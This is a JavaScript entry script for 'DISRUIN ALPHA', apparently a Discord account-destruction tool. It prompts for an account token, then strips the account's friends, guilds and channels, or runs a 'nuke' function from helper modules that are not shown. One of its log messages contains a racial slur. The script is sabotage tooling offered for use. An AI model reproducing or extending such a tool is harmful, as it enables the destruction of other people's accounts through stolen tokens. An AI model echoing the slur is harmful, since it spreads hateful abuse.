const { Color } = require('./src/modules/console');
const { User } = require('./src/modules/brain');

const Readline = require('readline').createInterface(
    { input: process.stdin, output: process.stdout }
);

const init = () => {
    console.clear();
    console.log(Color.banner);

    process.stdout.write(
        String.fromCharCode(27) + "]0;" + 'DISRUIN ALPHA' + String.fromCharCode(7)
    );

    Color.options.forEach(
        option => {
            Color.log(option, Color.options.indexOf(option) + 1);
        }
    );

    Readline.question(Color.list[1].code + '  > ', option => {
        if (!['1', '2'].includes(option)) return init();

        Readline.question(Color.list[1].code + '  Enter Token > ', token => {
            const user = new User(
                { token: token }
            );

            if (option == '1') {
                Color.log('Destroying account from inside...');
				user.removeFriends().catch(
                    (e) => {
                        Color.log(e);

                        setTimeout(() => {
                            init();
                        }, 1000);
                    }
                ),
				user.removeGuilds().catch(
                    (e) => {
                        Color.log(e);

                        setTimeout(() => {
                            init();
                        }, 2000);
                    }
                ),
				user.deleteChannels().catch(
                    (e) => {
                        Color.log(e);

                        setTimeout(() => {
                            init();
                        }, 2000);
                    }
                );
            } else if (option == '2') {
                Color.log('Killing niggers...');
                user.nuke().catch(
                    data => {
                        console.clear();
                        console.log(Color.banner);

                        data.forEach((d) => Color.log(d));
                        setTimeout(process.exit, 10000);
                    }
                )
            }

        });
    });
};

init();

